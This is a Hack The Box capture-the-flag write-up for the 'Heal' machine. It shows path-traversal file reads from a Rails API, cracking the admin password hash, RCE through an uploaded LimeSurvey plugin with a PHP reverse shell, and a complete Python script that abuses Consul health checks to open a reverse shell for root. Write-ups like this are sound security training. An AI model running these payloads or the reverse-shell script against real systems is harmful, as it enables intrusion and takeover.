```json
Alias: Heal
Date: 21-12_2024
Platform: Hackthebox
OS: Linux
Difficulty: Medium
Status: Complete
IP: 10.10.11.46
```

# Heal
# Summary

Heal is a medium difficulty box which requires a few steps to get to user. After which we encounter a Consul service running that can be leverage to privilege escalation.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-21 22:29 PKT
Nmap scan report for 10.10.11.46
Host is up (0.51s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.32 seconds
```
## Discovered Subdomains
```
heal.htb
api.heal.htb
take-survey.heal.htb
```

---
# Enumeration
## Port 80 - HTTP (Appache)

We encounter a login page at http://heal.htb. We can create an account and log in. Notice that the website keeps making API requests to http://api.heal.htb this is a rails App. We can also reach a limesurvey instance running at http://take-suvery.heal.htb with the "Take Survey Option". 

---

# Exploitation

After logging in we have the ability to create a resume and download it. The download option makes an API call to http://api.heal.htb/download?filename=name.pdf This is vulnerable to LFI, but trying to make requests at first gives the error "Token Not Found". We need to include the `Authorization` Header generated for us which is being sent to other HTTP requests to http://heal.htb after creating the account. Next since we know that http://api.heal.htb is running a ruby on rails instance, we can try extracting some config files common to it.

We can start by extracting `config/database.yml` as it contains information related to the database.

I tried:

```
http://api.heal.htb/download?filename=config/database.yml (File Not Found)
http://api.heal.htb/download?filename=../config/database.yml (File Not Found)
http://api.heal.htb/download?filename=../../config/database.yml (Found)
```

This file tells us that `sqlite3` is being used and the database is stored at `storage/development.sqlite3`

Get the file:  http://api.heal.htb/download?filename=../../storage/development.sqlite3

Open it in `sqlite3` and doing a `.dump` we get the hash for Ralph who is the administrator.

Crack with hashcat

`hashcat -m 3200 hash ~/Documents/Wordlists/rockyou.txt`

And we get:

| Username | Password  |
| -------- | --------- |
| ralph    | 147258369 |

Unfortunately we can't ssh into the box with these credentials but we can log in to limesurvey. Next all we need to do is upload a plugin and get RCE. This git repository is helpful for this: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/tree/main

A limesurvey plugin needs at minimum a config file and a PHP file. Then these files need to be archived and uploaded.

config.xml:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>RCEPlugin</name>
        <type>plugin</type>
        <creationDate>2013-03-28</creationDate>
        <lastUpdate>2018-02-03</lastUpdate>
        <author>0xfa11</author>
        <authorUrl>https://www.limesurvey.org</authorUrl>
        <version>1.0.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description><![CDATA[Author: 0xfa11]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
        <version>2.73</version>
    </compatibility>

    <updaters disabled="disabled">
    </updaters>
</config>
```

Next get your PHP reverse shell and zip both of these files together. After which on limesurvey, go to Configuration -> Plugins -> Upload & Install. Upload the zip file, start up your listener and activate it after which we can access the plugin at upload/plugins/#Name/#Shell_file_name. For me that would be

`http://take-survey.heal.htb/upload/plugins/RCEPlugin/php-reverse-shell-new.php`

---

# Privilege Escalation

After getting foothold I switched to a meterpreter shell as the PHP shell kept dying and I needed port forwarding as well. There is a service running on localhost:8500 called Consul. Consul can be thought of as a middle man that manages a bunch of services. For example, You can register a MySQL database as a service to it and and a bunch of different websites that use the database. The websites can then query consul about information regarding the database, as in whether it's healthy or if the IP has changed.

Consul also allows us to perform health checks on services and these health checks can be setup in a way so that Consul will execute code provided by us to perform the health checks. So the path to root is clear.

I added a port forwarding rule in meterpreter to start 

`portfwd add -l 8500 -p 8500 -r 127.0.0.1`

This will listen on my attack box (`-l`)  8500 and forward all traffic to the HTB machine (`-r`) on 127.0.0.1:8500. Now we can access the consul HTTP service on localhost:8500.

After which this nice python script can add a check for us that executes a reverse shell.

```python
# author: adan.alvarez.90@gmail.com
# Description:
#    - Creates a new check in Consul agent to obtain a reverse shell.

import requests
import sys
import argparse
import time
import json

if len(sys.argv) <= 1:
	print('[*] Script to create a new check in Consul agent to obtain a reverse shell')
	print('\n%s -h for help.' % (sys.argv[0]))
	exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
					dest="url",
					help="Consul URL",
					action='store')
parser.add_argument("-p", "--port",
					dest="port",
					help="Port for the reverse shell",
					action='store')
parser.add_argument("-i", "--ip",
					dest="ip",
					help="IP for the reverse shell",
					action='store')

args = parser.parse_args()
url = args.url if args.url else None
ip = args.ip if args.ip else None
port = args.port if args.port else None
python='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"]);'.format(ip, port)
data = {'ID': 'rc', 'Name': 'Remote code execution', 'Shell': '/bin/bash', 'Interval': '5s'}
data['Args']=['python3', '-c', python]
registerurl=url+"/v1/agent/check/register"
r = requests.put(registerurl, json=data)
time.sleep(5)

desregisterurl=url+"/v1/agent/service/deregister/rc"
r = requests.put(desregisterurl)

```

---

# Flags
- a39dcd7fe2b3f216beedecd558fa3bf7
- 07f775dc017139abf9dd7e6666c8d5ef

#CTF